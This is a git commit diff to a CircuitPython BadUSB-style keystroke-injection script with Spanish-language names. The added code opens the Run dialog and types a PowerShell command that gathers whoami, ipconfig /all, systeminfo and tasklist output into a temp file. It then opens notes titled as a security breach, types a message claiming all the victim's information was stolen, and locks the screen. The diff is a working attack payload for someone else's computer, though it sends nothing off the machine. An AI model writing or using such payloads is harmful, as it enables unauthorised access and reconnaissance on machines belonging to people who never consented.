d444615e1b040fc6ca2b0d125215c62c9db49163
ZIREAEL314 <jr6157065@gmail.com>
2025-12-28 02:40:41 -0600

    Update Mensaje y bloqueo.py

--- Mensaje y bloqueo.py
+++ Mensaje y bloqueo.py
@@ -12,7 +12,18 @@ kbd.press(Keycode.GUI, Keycode.R)
 kbd.release_all()
 time.sleep(0.5)
 
-layout.write("cmd /c \"echo. > %temp%\\note.txt && notepad %temp%\\note.txt\"") 
+cmd_recon = "powershell -c \"$f=$env:TEMP+'\\REUNIENDO_TU_INFORMACION.txt'; '---RECON---' > $f; whoami >> $f; ipconfig /all >> $f; systeminfo >> $f; tasklist >> $f; notepad $f\""
+layout.write(cmd_recon)
+kbd.press(Keycode.ENTER)
+kbd.release_all()
+
+time.sleep(5.0)
+
+kbd.press(Keycode.GUI, Keycode.R)
+kbd.release_all()
+time.sleep(0.5)
+
+layout.write("cmd /c \"echo. > %temp%\\SEGURIDAD_VULNERADA.txt && notepad %temp%\\SEGURIDAD_VULNERADA.txt\"") 
 kbd.press(Keycode.ENTER)
 kbd.release_all()
 time.sleep(1.5) # Esperar a que el sistema procese y abra
@@ -22,3 +33,5 @@ layout.write("GRACIAS POR PERMITIR MI ACCESO, TODA TU INFORMACION FUE ROBADA :)"
 time.sleep(3.0)
 kbd.press(Keycode.GUI,Keycode.L)
 kbd.release_all()
+
+
